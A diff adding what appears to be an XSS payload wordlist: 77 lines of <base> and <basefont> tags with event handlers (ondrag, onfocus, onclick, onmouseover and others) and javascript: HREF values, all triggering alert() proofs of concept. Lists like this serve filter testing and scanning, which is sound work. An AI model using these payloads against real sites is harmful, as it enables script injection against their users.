@@ -1,0 +1,77 @@
+<base draggable="true" ondrag="alert(1)">test</base>
+<base draggable="true" ondragend="alert(1)">test</base>
+<base draggable="true" ondragenter="alert(1)">test</base>
+<base draggable="true" ondragleave="alert(1)">test</base>
+<base draggable="true" ondragstart="alert(1)">test</base>
+<basefont draggable="true" ondrag="alert(1)">test</basefont>
+<basefont draggable="true" ondragend="alert(1)">test</basefont>
+<basefont draggable="true" ondragenter="alert(1)">test</basefont>
+<basefont draggable="true" ondragleave="alert(1)">test</basefont>
+<basefont draggable="true" ondragstart="alert(1)">test</basefont>
+<basefont id=x tabindex=1 onactivate=alert(1)></basefont>
+<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>
+<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>
+<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>
+<basefont id=x tabindex=1 onfocus=alert(1)></basefont>
+<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>
+<basefont onbeforecopy="alert(1)" contenteditable>test</basefont>
+<basefont onbeforecut="alert(1)" contenteditable>test</basefont>
+<basefont onbeforepaste="alert(1)" contenteditable>test</basefont>
+<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>
+<basefont onclick="alert(1)">test</basefont>
+<basefont oncontextmenu="alert(1)">test</basefont>
+<basefont oncopy="alert(1)" contenteditable>test</basefont>
+<basefont oncut="alert(1)" contenteditable>test</basefont>
+<basefont ondblclick="alert(1)">test</basefont>
+<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>
+<basefont onkeydown="alert(1)" contenteditable>test</basefont>
+<basefont onkeypress="alert(1)" contenteditable>test</basefont>
+<basefont onkeyup="alert(1)" contenteditable>test</basefont>
+<basefont onmousedown="alert(1)">test</basefont>
+<basefont onmouseenter="alert(1)">test</basefont>
+<basefont onmouseleave="alert(1)">test</basefont>
+<basefont onmousemove="alert(1)">test</basefont>
+<basefont onmouseout="alert(1)">test</basefont>
+<basefont onmouseover="alert(1)">test</basefont>
+<basefont onmouseup="alert(1)">test</basefont>
+<basefont onpaste="alert(1)" contenteditable>test</basefont>
+<base href=//0>
+<BASE HREF="javascript:alert(1046);//">
+<BASE HREF="javascript:alert(1679);//">
+<BASE HREF="javascript:alert(1762);//">
+<;BASE HREF=";javascript:alert(1876);//";>;
+<BASE HREF="javascript.:alert(265);//">
+<BASE HREF="javascript:alert(765);//">
+<;BASE HREF=";javascript:alert(';XSS';);//";>;
+<BASE HREF="javascript:alert('XSS');//">
+<base HREF="javascript:document.vulnerable=true;//">
+<BASE HREF="javascript:javascript:alert(1);//">
+<BASE HREF="javascript:javascript:alert(1605);//">
+<BASE HREF="javascript:javascript:alert(691);//">
+<base id=x tabindex=1 onactivate=alert(1)></base>
+<base id=x tabindex=1 onbeforeactivate=alert(1)></base>
+<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>
+<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>
+<base id=x tabindex=1 onfocus=alert(1)></base>
+<base id=x tabindex=1 onfocusin=alert(1)></base>
+<base onbeforecopy="alert(1)" contenteditable>test</base>
+<base onbeforecut="alert(1)" contenteditable>test</base>
+<base onbeforepaste="alert(1)" contenteditable>test</base>
+<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>
+<base onclick="alert(1)">test</base>
+<base oncontextmenu="alert(1)">test</base>
+<base oncopy="alert(1)" contenteditable>test</base>
+<base oncut="alert(1)" contenteditable>test</base>
+<base ondblclick="alert(1)">test</base>
+<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>
+<base onkeydown="alert(1)" contenteditable>test</base>
+<base onkeypress="alert(1)" contenteditable>test</base>
+<base onkeyup="alert(1)" contenteditable>test</base>
+<base onmousedown="alert(1)">test</base>
+<base onmouseenter="alert(1)">test</base>
+<base onmouseleave="alert(1)">test</base>
+<base onmousemove="alert(1)">test</base>
+<base onmouseout="alert(1)">test</base>
+<base onmouseover="alert(1)">test</base>
+<base onmouseup="alert(1)">test</base>
+<base onpaste="alert(1)" contenteditable>test</base>
